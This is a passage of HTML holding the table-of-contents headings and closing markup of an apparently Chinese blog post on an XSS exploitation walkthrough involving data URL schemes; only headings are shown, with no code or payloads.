class="toc-number">1.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#一步一步的利用"><span class="toc-number">1.2.</span> <span class="toc-text">一步一步的利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#将url转为js"><span class="toc-number">1.3.</span> <span class="toc-text">将url转为js</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#最后考虑XSS"><span class="toc-number">1.4.</span> <span class="toc-text">最后考虑XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#最后一步"><span class="toc-number">1.5.</span> <span class="toc-text">最后一步</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-number">1.6.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#什么是data-url-schema"><span class="toc-number">1.7.</span> <span class="toc-text">什么是data url schema</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Data-URI的格式规范"><span class="toc-number">1.7.1.</span> <span class="toc-text">Data URI的格式规范,</span></a></li></ol></li></ol></li></ol></div><!-- top--><i class="fa fa-arrow-up close" id="go-up" aria-hidden="true"></i></body></html>